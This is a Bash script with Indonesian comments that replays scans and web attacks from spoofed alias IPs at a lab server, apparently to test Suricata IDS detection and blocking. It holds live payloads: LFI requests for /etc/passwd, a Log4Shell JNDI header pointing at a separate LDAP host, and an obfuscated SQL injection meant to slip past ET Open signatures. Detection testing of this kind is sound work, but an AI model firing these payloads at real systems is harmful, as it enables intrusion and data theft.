#!/bin/bash
# ==============================================================================
# SuricataEVE - Automated Attack Script (Fixed & Reliable)
# ==============================================================================

TARGET="${TARGET:-192.168.216.128}"
IFACE="${IFACE:-}"

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}Error: Jalankan sebagai root (sudo ./atk.sh)${NC}"
  exit 1
fi

# ------------ AUTO-DETECT INTERFACE -------------------------------------------
# Jika IFACE tidak di-set, deteksi otomatis interface yang punya default route
if [ -z "$IFACE" ]; then
    IFACE=$(ip route get 8.8.8.8 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="dev") print $(i+1)}' | head -1)
    if [ -z "$IFACE" ]; then
        IFACE=$(ip link show | awk -F': ' '/^[0-9]+: (eth|ens|enp|wlan)/{print $2; exit}')
    fi
fi

if [ -z "$IFACE" ]; then
    echo -e "${RED}[ERROR] Tidak bisa mendeteksi interface jaringan.${NC}"
    echo -e "Jalankan dengan: ${CYAN}sudo IFACE=eth0 ./atk.sh${NC}"
    exit 1
fi

header() {
    echo -e "\n${BLUE}${BOLD}================================================================${NC}"
    echo -e "${CYAN}${BOLD} $1 ${NC}"
    echo -e "${BLUE}${BOLD}================================================================${NC}\n"
}
info()    { echo -e "${YELLOW}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
atk()     { echo -e "${RED}[!]${NC} $1"; }

setup_all_ips() {
    info "Interface terdeteksi: ${BOLD}${IFACE}${NC}"
    info "Menyiapkan 12 IP Bayangan (101..112) di ${IFACE}..."
    for i in {101..112}; do
        ip addr add 192.168.216.$i/24 dev ${IFACE} 2>/dev/null && \
            echo -e "  ${GREEN}✓${NC} 192.168.216.$i" || \
            echo -e "  ${YELLOW}~${NC} 192.168.216.$i (sudah ada)"
    done
    sleep 0.5   # Beri waktu kernel assign IP sebelum curl digunakan
    success "Semua IP Bayangan siap!"
}

cleanup_all_ips() {
    info "Menghapus semua IP Bayangan dari ${IFACE}..."
    for i in {101..112}; do
        ip addr del 192.168.216.$i/24 dev ${IFACE} 2>/dev/null
    done
    success "Selesai."
}

# Helper curl: kirim N kali request dengan IP tertentu ke URL
# Usage: do_curl <ip> <url> [extra_curl_opts...]
do_curl() {
    local SRC_IP="$1"; shift
    local URL="$1"; shift
    local EXTRA="$@"
    for i in {1..5}; do
        curl -s -o /dev/null -w "" --connect-timeout 3 \
            --interface "${SRC_IP}" \
            ${EXTRA} \
            "${URL}" 2>/dev/null
        sleep 0.2
    done
}

# ------------------------------------------------------------------------------
# 10 SERANGAN (TRUE POSITIVE: .101 s/d .110)
# Semua menggunakan URL root "/" agar tidak bergantung path DVWA tertentu
# ------------------------------------------------------------------------------

do_1_portscan() {
    header "1. Port Scan Aggressive (Nmap) -> IP: .101"
    atk "Scanning port dengan OS detection..."
    nmap -S 192.168.216.101 -e ${IFACE} \
        -sV -sC -A -T4 -p 1-1000 ${TARGET} -Pn --max-retries 2 \
        >/dev/null 2>&1
    success "Selesai."
}

do_2_synscan() {
    header "2. SYN Stealth Scan (Nmap) -> IP: .102"
    atk "TCP SYN scan diam-diam..."
    nmap -S 192.168.216.102 -e ${IFACE} \
        -sS -O --osscan-guess -T4 ${TARGET} -Pn --max-retries 2 \
        >/dev/null 2>&1
    success "Selesai."
}

do_3_useragent_nikto() {
    header "3. Nikto Web Scanner (User-Agent) -> IP: .103"
    atk "Mengirim User-Agent scanner Nikto (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.103 "http://${TARGET}/" \
        -H "User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:map_codes)"
    success "Selesai (5x request)."
}

do_4_sqlmap_useragent() {
    header "4. sqlmap User-Agent -> IP: .104"
    atk "Mengirim User-Agent sqlmap otomatis (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.104 "http://${TARGET}/" \
        -H "User-Agent: sqlmap/1.7.6#stable (https://sqlmap.org)"
    success "Selesai (5x request)."
}

do_5_lfi() {
    header "5. Local File Inclusion (path traversal) -> IP: .105"
    atk "Mencoba baca /etc/passwd via path traversal (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.105 \
        "http://${TARGET}/?page=../../../../../../../../etc/passwd"
    do_curl 192.168.216.105 \
        "http://${TARGET}/index.php?file=../../../etc/passwd"
    success "Selesai (10x request)."
}

do_6_morfeus() {
    header "6. Morfeus Web Scanner (muieblackcat) -> IP: .106"
    atk "Signature scanner Morfeus (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.106 "http://${TARGET}/muieblackcat"
    do_curl 192.168.216.106 "http://${TARGET}/w00tw00t.at.ISC.SANS.DFind:)"
    success "Selesai (10x request)."
}

do_7_phpeasteregg() {
    header "7. PHP Easter Egg -> IP: .107"
    atk "PHP Easter Egg info disclosure (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.107 \
        "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"
    do_curl 192.168.216.107 \
        "http://${TARGET}/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"
    success "Selesai (10x request)."
}

do_8_gobuster() {
    header "8. Gobuster Directory Scanner -> IP: .108"
    atk "User-Agent scanner Gobuster (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.108 "http://${TARGET}/admin/" \
        -H "User-Agent: gobuster/3.1.0"
    do_curl 192.168.216.108 "http://${TARGET}/.git/config" \
        -H "User-Agent: gobuster/3.1.0"
    success "Selesai (10x request)."
}

do_9_log4shell() {
    header "9. Log4Shell CVE-2021-44228 -> IP: .109"
    atk "JNDI injection via User-Agent (ET rule: EXPLOIT)..."
    do_curl 192.168.216.109 "http://${TARGET}/" \
        -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}'
    do_curl 192.168.216.109 "http://${TARGET}/" \
        -H 'X-Api-Version: ${jndi:ldap://192.168.216.120:1389/a}'
    success "Selesai (10x request)."
}

do_10_httptrace() {
    header "10. HTTP TRACE Method (XST) -> IP: .110"
    atk "HTTP TRACE terlarang (ET rule: WEB_SERVER)..."
    do_curl 192.168.216.110 "http://${TARGET}/" \
        -X TRACE
    success "Selesai (5x request)."
}

# ------------------------------------------------------------------------------
# 2 SKENARIO KONTROL (TIDAK BOLEH TERBLOKIR: .111 dan .112)
# ------------------------------------------------------------------------------

do_11_bypass_obfuscation() {
    header "11. [FALSE NEGATIVE] SQLi Obfuscation -> IP: .111"
    info "Payload yang tidak ada di signature ET Open..."
    curl -s -o /dev/null --connect-timeout 3 \
        --interface 192.168.216.111 \
        "http://${TARGET}/vulnerabilities/sqli/?id=1%20%2F%2A%2150000UNION%2A%2F%20%2F%2A%2150000SELECT%2A%2F%201%2Cuser%28%29&Submit=Submit" \
        2>/dev/null
    success "Terkirim. Tidak perlu terblokir."
}

do_12_normal_user() {
    header "12. [NORMAL TRAFFIC] Pengguna Sah -> IP: .112"
    info "Akses web normal, tidak boleh diblokir..."
    curl -s -o /dev/null --connect-timeout 3 \
        --interface 192.168.216.112 "http://${TARGET}/" 2>/dev/null
    curl -s -o /dev/null --connect-timeout 3 \
        --interface 192.168.216.112 "http://${TARGET}/index.php" 2>/dev/null
    success "Terkirim. Traffic normal."
}

# ------------------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------------------

do_all() {
    setup_all_ips
    header "MEMULAI SEMUA PENGUJIAN"

    do_1_portscan
    do_2_synscan
    do_3_useragent_nikto
    do_4_sqlmap_useragent
    do_5_lfi
    do_6_morfeus
    do_7_phpeasteregg
    do_8_gobuster
    do_9_log4shell
    do_10_httptrace

    do_11_bypass_obfuscation
    do_12_normal_user

    header "PENGUJIAN SELESAI!"
    echo -e "${YELLOW}Jalankan di server:${NC} python3 report.py"
}

while true; do
    echo -e "\n${BLUE}${BOLD}=== SURICATAEVE ATTACK SUITE ===${NC}"
    echo -e "Target  : ${BOLD}http://${TARGET}${NC}"
    echo -e "Interface: ${BOLD}${IFACE}${NC}\n"

    echo -e "  ${GREEN}[ATTACK SCENARIOS - EXPECT DETECTION]${NC}"
    echo -e "  ${BOLD} 1${NC}) Nmap Aggressive Scan         (IP: .101)"
    echo -e "  ${BOLD} 2${NC}) Nmap SYN Stealth Scan         (IP: .102)"
    echo -e "  ${BOLD} 3${NC}) Nikto User-Agent              (IP: .103)"
    echo -e "  ${BOLD} 4${NC}) sqlmap User-Agent             (IP: .104)"
    echo -e "  ${BOLD} 5${NC}) LFI /etc/passwd               (IP: .105)"
    echo -e "  ${BOLD} 6${NC}) Morfeus Scanner               (IP: .106)"
    echo -e "  ${BOLD} 7${NC}) PHP Easter Egg                (IP: .107)"
    echo -e "  ${BOLD} 8${NC}) Gobuster Scanner              (IP: .108)"
    echo -e "  ${BOLD} 9${NC}) Log4Shell CVE-2021-44228      (IP: .109)"
    echo -e "  ${BOLD}10${NC}) HTTP TRACE Method             (IP: .110)"
    echo ""
    echo -e "  ${YELLOW}[CONTROL SCENARIOS]${NC}"
    echo -e "  ${BOLD}11${NC}) SQLi Obfuscation Bypass (FN)  (IP: .111)"
    echo -e "  ${BOLD}12${NC}) Normal User Traffic (TN)      (IP: .112)"
    echo ""
    echo -e "  ${CYAN}[ACTIONS]${NC}"
    echo -e "  ${BOLD}A${NC}) Jalankan Semua Sekaligus"
    echo -e "  ${BOLD}C${NC}) Bersihkan IP Bayangan"
    echo -e "  ${BOLD}0${NC}) Keluar"
    echo ""
    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih [0-12 / A / C]: " CHOICE

    case $CHOICE in
         1) do_1_portscan ;;
         2) do_2_synscan ;;
         3) do_3_useragent_nikto ;;
         4) do_4_sqlmap_useragent ;;
         5) do_5_lfi ;;
         6) do_6_morfeus ;;
         7) do_7_phpeasteregg ;;
         8) do_8_gobuster ;;
         9) do_9_log4shell ;;
        10) do_10_httptrace ;;
        11) do_11_bypass_obfuscation ;;
        12) do_12_normal_user ;;
        [Aa]) do_all ;;
        [Cc]) cleanup_all_ips ;;
         0) cleanup_all_ips; echo "Keluar."; exit 0 ;;
         *) echo -e "${RED}Pilihan tidak valid!${NC}" ;;
    esac
done
